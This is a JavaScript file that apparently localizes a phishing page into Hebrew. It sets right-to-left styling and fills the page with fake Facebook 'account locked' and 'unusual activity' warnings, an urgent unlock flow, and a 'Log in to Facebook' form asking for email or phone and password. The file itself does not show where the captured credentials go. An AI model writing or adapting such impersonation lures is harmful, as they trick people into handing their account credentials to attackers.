document.getElementsByTagName("body")[0].style.direction = "rtl";
document.querySelector(".borderline").style.cssText = `border-left: none;border-right: 2px solid #e4e6eb; margin-left: 0%;margin-right: 7%;`;
document.querySelector(".home-bullet-box").style.cssText = `margin-left:0;margin-right: -37px;`;
document.querySelector(".home-s-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -37px;`;
document.querySelector(".home-t-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -37px;`;
document.querySelector(".home-container1 .logo").style.cssText = `margin-right: 20px;`;
var mq = window.matchMedia( "(max-width: 570px)" );
if (mq.matches) {
   document.querySelector(".home-bullet-box").style.cssText = `margin-left:0;margin-right: -26px;`
   document.querySelector(".home-s-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -26px;`;
	document.querySelector(".home-t-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -26px;`;
}


var mainHeader = document.querySelector(".home-main-header .home-heading");
var mainParagraph = document.querySelector(".home-mainparagrph .home-text");
var lockedHeader = document.querySelector(".home-lockedheader .home-text1");
var lockedParagraph = document.querySelector(".home-lockedinfobox .home-container6 .home-text5");
var footerParagraph = document.querySelector(".home-main-card .home-container7 .home-text6");
var getStarted = document.querySelector(".home-main-card .home-link");
var nextHeader = document.querySelector(".home-next-card .home-unlock-header .home-text");
var fristLineHeader = document.querySelector(".home-f-line .home-text03");
var fristLineParagraph = document.querySelector(".home-f-line .home-text05 span"); 
var secoundLineHeader = document.querySelector(".home-s-line .home-text09"); 
var thirdLineHeader = document.querySelector(".home-t-line .home-text12"); 
var nextButton = document.querySelector(".home-next-buttons .home-button1");
var backButton = document.querySelector(".home-next-buttons .home-button");
var logHeading = document.querySelector(".home-log-card .dlog .home-heading");
var logAlert = document.querySelector(".home-log-card .home-alert");
var logAlert2 = document.getElementById("alert");
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".home-submit"); 
var or = document.querySelector(".home-or");
var createButton = document.querySelector(".home-creat-new");

mainHeader.innerHTML ="חשבונך ננעל";
mainParagraph.innerHTML ="ראינו פעילות חריגה בחשבון שלך";
lockedHeader.innerHTML ="החשבון ננעל ב-10 בנובמבר 2021";
lockedParagraph.innerHTML ="כדי להגן עליך, הפרופיל שלך אינו גלוי לאנשים בפייסבוק ואתה לא יכול להשתמש בחשבון שלך";
footerParagraph.innerHTML ="אנו ניקח אותך דרך כמה שלבים לביטול נעילת החשבון שלך";
getStarted.innerHTML ="להתחיל";
nextHeader.innerHTML ="כיצד לבטל את נעילת החשבון שלך";
fristLineHeader.innerHTML ="אשר שזה החשבון שלך";
fristLineParagraph.innerHTML ="מכיוון שלמישהו אחר אולי הייתה גישה, עלינו לאשר שאתה הבעלים של החשבון הזה לפני שנמשיך הלאה";
secoundLineHeader.innerHTML ="אבטח את פרטי הכניסה שלך";
thirdLineHeader.innerHTML ="חשבונך יבוטל";
nextButton.innerHTML ="הַבָּא";
backButton.innerHTML ="חזור";
logHeading.innerHTML ="היכנס לפייסבוק";
logAlert.innerHTML ="אתה צריך להתחבר תחילה";
logAlert2.innerHTML ="אתה צריך להתחבר תחילה";
userInput.setAttribute("placeholder" , "כתובת אימייל או מספר טלפון");
passInput.setAttribute("placeholder" , "סיסמה");
logButton.innerHTML ="התחברות";
or.innerHTML ="אוֹ";
createButton.innerHTML ="ליצור חשבון חדש";
